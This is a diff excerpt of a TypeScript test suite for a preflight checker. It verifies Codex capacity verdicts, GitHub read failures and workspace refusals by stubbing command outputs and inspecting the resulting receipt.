+    return { box, head, root, repo };
+  }
+  const checkOf = (box: ReturnType<typeof sandboxFor>, name: string) => box.receipt().json.checks.find((c: { name: string }) => c.name === name);
+
+  it("binds the receipt G7 needs when every check passes", () => {
+    const { box, head, root, repo } = passingBox();
     const result = box.run();
     expect(result.status, result.stdout + result.stderr).toBe(0);
     const { json } = box.receipt();
     expect(json.checks.filter((c: { status: string }) => c.status !== "pass")).toEqual([]);
     expect(json).toMatchObject({ outcome: "succeeded", arcadiaHead: head, brokerRevision: head, githubRepository: repo, rootCommit: root, workspace: path.join(box.root, "martianrover"), policyRevision: 5, policyEpoch: 3 });
+  });
+
+  it.each([
+    ["usage-limited", "refuse", { availability: "usage_limited" }],
+    ["budget-limited", "refuse", { availability: "budget_limited" }],
+    ["an observed capacity with unknown availability", "refuse", { availability: "unknown" }],
+    ["simulated evidence", "refuse", { evidence: "simulated" }],
+    ["an unrecognised evidence mode", "refuse", { evidence: "observed" }],
+    ["an operator attestation, which carries no provider availability", "pass", { confidence: "attested", unattendedProof: false, availability: "unknown" }],
+    ["an attested capacity that is usage-limited", "refuse", { confidence: "attested", availability: "usage_limited" }]
+  ])("judges Codex capacity with %s as %s", (_label, verdict, override) => {
+    const { box } = passingBox(() => ({ "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: { ...passingCapacity, ...override } }) } }));
+    const result = box.run();
+    expect(checkOf(box, "codex_capacity")).toMatchObject({ status: verdict });
+    expect(result.status === 0).toBe(verdict === "pass");
+  });
+
+  it("reports an HTTP error reading genesis check runs once, as unreadable rather than 'none'", () => {
+    const body = JSON.stringify({ message: "Not Found", documentation_url: "https://docs.github.com/rest", status: "404" });
+    const { box } = passingBox((repo, root) => ({ [`gh api repos/${repo}/commits/${root}/check-runs`]: { status: 1, stdout: body, stderr: "gh: Not Found (HTTP 404)" } }));
+    expect(box.run().status).not.toBe(0);
+    const check = checkOf(box, "github_checks");
+    expect(check.status).toBe("refuse");
+    expect(check.detail).toContain("genesis CI checks are unreadable (the GitHub check-runs read failed)");
+    expect(check.detail).not.toMatch(/none/);
+  });
+
+  it("refuses the repository when the main-branch read fails with an HTTP error, without mixing the error body into the verdict", () => {
+    const body = JSON.stringify({ message: "Branch not found", status: "404" });
+    const { box, root } = passingBox((repo) => ({ [`gh api repos/${repo}/branches/main`]: { status: 1, stdout: body } }));
+    expect(box.run().status).not.toBe(0);
+    expect(checkOf(box, "github_repository")).toMatchObject({ status: "refuse" });
+    expect(checkOf(box, "github_repository").detail).toContain(`main at genesis ${root}`);
+  });
+
+  it("names an exported ARCADIA_WORKSPACE in the workspace refusal", () => {
+    const { box } = passingBox((_repo, _root, boxRoot) => ({ "arcadia workspace resolve": ok({ source: "environment variable", workspacePath: path.join(boxRoot, "martianrover") }) }));
+    expect(box.run({ ARCADIA_WORKSPACE: path.join(box.root, "martianrover") }).status).not.toBe(0);
+    expect(checkOf(box, "workspace")).toMatchObject({ status: "refuse" });
+    expect(checkOf(box, "workspace").detail).toContain("unset ARCADIA_WORKSPACE");
   });
 
   it("refuses a manifest repository outside the disposable pattern without reading it on GitHub", () => {
